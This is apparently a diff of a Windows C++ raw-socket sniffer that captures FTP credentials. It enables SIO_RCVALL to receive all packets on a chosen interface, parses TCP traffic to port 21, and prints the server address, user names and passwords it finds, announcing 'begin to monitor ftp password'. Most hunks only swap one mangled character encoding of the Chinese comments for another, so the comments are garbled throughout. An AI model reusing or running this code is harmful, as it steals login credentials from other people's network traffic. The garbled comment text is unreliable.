@@ -26,35 +26,36 @@ void GetFtp(char *pData, DWORD dwDestIp)
 
 		wsprintf(szBuf, " Server Address: %s; User Name: %s; Password: %s; \n\n", ::inet_ntoa(*(in_addr*)&dwDestIp), szUserName, szPassword);
 
-		printf(szBuf);	// ÕâÀïÄú¿ÉÒÔ½«Ëü±£´æµ½ÎÄ¼şÖĞ
+		printf(szBuf);	// è¿™é‡Œæ‚¨å¯ä»¥å°†å®ƒä¿å­˜åˆ°æ–‡ä»¶ä¸­
 	}
 }
 
-//¾ßÌå½á¹¹Ìå¶¨ÒåÔÚprotoinfo.hÖĞ 
+//å…·ä½“ç»“æ„ä½“å®šä¹‰åœ¨protoinfo.hä¸­ 
 void DecodeIPPacket(char *pData)
 {
-	//»ñÈ¡ipÍ·²¿ 
+	//è·å–ipå¤´éƒ¨ 
 	IPHeader *pIPHdr = (IPHeader*)pData;
-	// iphVerLen°æ±¾ºÅºÍÍ·³¤¶È£¨¸÷Õ¼4Î»£©
+	// iphVerLenç‰ˆæœ¬å·å’Œå¤´é•¿åº¦ï¼ˆå„å 4ä½ï¼‰
 	int nHeaderLen = (pIPHdr->iphVerLen & 0xf) * sizeof(ULONG);
-	//»òÈ±Ğ­ÒéÀàĞÍ 
+	//æˆ–ç¼ºåè®®ç±»å‹ 
 	switch(pIPHdr->ipProtocol)
 	{
-		//´¦ÀíipĞ­Òé 
+		//å¤„ç†ipåè®® 
 	case IPPROTO_TCP:
 		{
 			
 			TCPHeader *pTCPHdr = (TCPHeader *)(pData + nHeaderLen);
 			switch(::ntohs(pTCPHdr->destinationPort))
 			{
-			case 21:	// ftpĞ­Òé
+			case 21:	// ftpåè®®
 				{
 					cout<<"get info\n";
+					//åˆ†æftpæŠ¥æ–‡
 					GetFtp((char*)pTCPHdr + sizeof(TCPHeader), pIPHdr->ipDestination);
 				}
 				break;
 
-			case 80:	// httpĞ­Òé...
+			case 80:	// httpåè®®...
 			case 8080:
 				
 				break;
@@ -71,10 +72,10 @@ void DecodeIPPacket(char *pData)
 
 int main()
 {
-	// ´´½¨Ô­Ê¼Ì×½Ú×Ö
+	// åˆ›å»ºåŸå§‹å¥—èŠ‚å­—
 	SOCKET sRaw = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
 
-	// »ñÈ¡±¾µØIPµØÖ·
+	// è·å–æœ¬åœ°IPåœ°å€
 	char szHostName[56];
 	SOCKADDR_IN addr_in;
 	struct  hostent *pHost;
@@ -83,39 +84,39 @@ int main()
 	if( pHost== NULL)	
 		return -1;
 	else{
-		cout<<"¿ÉÓÃipÎª\n";
+		cout<<"å¯ç”¨ipä¸º\n";
 		int i=0;
 		struct in_addr addr; 
 		while(pHost->h_addr_list[i]!=0){
 			
-			cout<<"ipÎª£º"<<i<<"# "<<*(u_long*) pHost->h_addr_list[i++];
+			cout<<"ipä¸ºï¼š"<<i<<"# "<<*(u_long*) pHost->h_addr_list[i++];
 			
 		}
 	}
 		
 		 
-	// ÔÚµ÷ÓÃioctlÖ®Ç°£¬Ì×½Ú×Ö±ØĞë°ó¶¨
+	// åœ¨è°ƒç”¨ioctlä¹‹å‰ï¼Œå¥—èŠ‚å­—å¿…é¡»ç»‘å®š
 	addr_in.sin_family  = AF_INET;
 	addr_in.sin_port    = htons(0);
-	//°Ñ¿ÉÓÃipÁĞ±íÖĞipÉèÖÃÎª°ó¶¨ip
-	cout<<"\nÇëÑ¡ÔñÊ¹ÓÃµÄ±¾µØip\n";
+	//æŠŠå¯ç”¨ipåˆ—è¡¨ä¸­ipè®¾ç½®ä¸ºç»‘å®šip
+	cout<<"\nè¯·é€‰æ‹©ä½¿ç”¨çš„æœ¬åœ°ip\n";
 	int ip_i;
 	cin>>ip_i; 
 	memcpy(&addr_in.sin_addr.S_un.S_addr, pHost->h_addr_list[ip_i], pHost->h_length);
 	
 	printf(" Binding to interface : %s \n", ::inet_ntoa(addr_in.sin_addr));
 	if(bind(sRaw, (PSOCKADDR)&addr_in, sizeof(addr_in)) == SOCKET_ERROR){
-		cout<<"°ó¶¨¶Ë¿Ú´íÎó"<<endl;
+		cout<<"ç»‘å®šç«¯å£é”™è¯¯"<<endl;
 		return -1;
 	}
 		
 
-	// ÉèÖÃSIO_RCVALL¿ØÖÆ´úÂë£¬ÒÔ±ã½ÓÊÕËùÓĞµÄIP°ü	
+	// è®¾ç½®SIO_RCVALLæ§åˆ¶ä»£ç ï¼Œä»¥ä¾¿æ¥æ”¶æ‰€æœ‰çš„IPåŒ…	
 	DWORD dwValue = 1;
 	if(ioctlsocket(sRaw, SIO_RCVALL, &dwValue) != 0)	
 		return -1;
 	
-	// ¿ªÊ¼½ÓÊÕ·â°ü
+	// å¼€å§‹æ¥æ”¶å°åŒ…
 	printf(" \n\n begin to monitor ftp password... \n\n");
 	char buff[1024];
 	int nRet;
